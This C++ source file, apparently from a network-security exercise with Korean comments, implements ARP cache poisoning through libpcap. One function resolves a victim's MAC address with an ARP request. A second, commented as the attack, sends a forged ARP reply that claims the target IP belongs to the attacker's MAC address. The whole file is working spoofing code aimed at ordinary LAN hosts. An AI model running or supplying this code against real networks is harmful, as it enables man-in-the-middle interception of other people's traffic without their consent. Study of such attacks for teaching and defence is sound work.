#include "arpmanager.h"

#include <cstdio>
#include <chrono>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

bool getSenderMac( //상mac조회
    pcap_t* pcap,
    const Mac& attackerMac,
    const Ip& attackerIp,
    const Ip& senderIp,
    Mac& senderMac
    ) {
    EthArpPacket request;

    // Ethernet 헤더
    request.eth_.dmac_ = Mac::broadcastMac(); //목적지
    request.eth_.smac_ = attackerMac;
    request.eth_.type_ = htons(EthHdr::Arp);

    // ARP Request 헤더
    request.arp_.hrd_ = htons(ArpHdr::ETHER);
    request.arp_.pro_ = htons(EthHdr::Ip4);
    request.arp_.hln_ = Mac::Size;
    request.arp_.pln_ = Ip::Size;
    request.arp_.op_ = htons(ArpHdr::Request);
    request.arp_.smac_ = attackerMac;
    request.arp_.sip_ = htonl(attackerIp);
    request.arp_.tmac_ = Mac::nullMac();
    request.arp_.tip_ = htonl(senderIp);

    int result = pcap_sendpacket( //위조arp
        pcap,
        reinterpret_cast<const u_char*>(&request),
        sizeof(request)
        );

    if (result != 0) {
        fprintf(stderr, "failed to send ARP request: %s\n",
                pcap_geterr(pcap));
        return false;
    }

    auto start = std::chrono::steady_clock::now(); //응답기다림

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* data;

        int res = pcap_next_ex(pcap, &header, &data);

        if (res == 1) {
            if (header->caplen < sizeof(EthArpPacket)) 
                continue;

            const EthArpPacket* reply =
                reinterpret_cast<const EthArpPacket*>(data);

            if (reply->eth_.type() != EthHdr::Arp) //필요없는거 스킵스킵
                continue;

            if (reply->arp_.op() != ArpHdr::Reply)
                continue;

            if (!(reply->arp_.sip() == senderIp))
                continue;

            senderMac = reply->arp_.smac();
            return true;
        }

        if (res == -1) {
            fprintf(stderr, "pcap_next_ex failed: %s\n",
                    pcap_geterr(pcap));
            return false;
        }

        auto elapsed = std::chrono::steady_clock::now() - start;

        if (elapsed > std::chrono::seconds(5)) {
            fprintf(stderr, "ARP reply timeout\n");
            return false;
        }
    }
}

bool sendInfectPacket( //공격
    pcap_t* pcap,
    const Mac& attackerMac,
    const Mac& senderMac,
    const Ip& senderIp,
    const Ip& targetIp
    ) {
    EthArpPacket packet;

    // Ethernet
    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP Reply
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    int result = pcap_sendpacket(
        pcap,
        reinterpret_cast<const u_char*>(&packet),
        sizeof(packet)
        );

    if (result != 0) {
        fprintf(stderr, "failed to send infection packet: %s\n",
                pcap_geterr(pcap));
        return false;
    }

    return true;
}
